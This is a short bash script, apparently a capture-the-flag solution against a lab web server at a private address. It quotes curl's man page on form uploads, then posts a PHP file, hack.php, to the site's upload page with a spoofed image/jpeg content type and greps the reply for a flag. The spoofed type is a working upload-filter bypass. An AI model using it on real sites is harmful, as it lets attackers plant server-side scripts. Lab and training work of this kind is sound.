#!/bin/bash

# $ man curl
# 	...
# 	-F, --form <name=content>
# 	You can also tell curl what Content-Type to use by using 'type=', in a manner similar to:
# 		curl -F "web=@index.html;type=text/html" example.com
# 		or
# 		curl -F "name=daniel;type=text/foo" example.com
# 		You can also explicitly change the name field of a file upload part by setting filename=, like this:
# 		curl  example.com
# 		If filename/path contains ',' or ';', it must be quoted by double-quotes like:
# 		curl -F "file=@\"local,file\";filename=\"name;in;post\"" example.com
# 		or
# 		curl -F 'file=@"local,file";filename="name;in;post"' example.com

IP="192.168.56.101"

curl -v -X POST http://${IP}/?page=upload \
		-F "uploaded=@hack.php;filename=hack.php;type=image/jpeg" \
		-F "Upload=Upload" \
| grep flag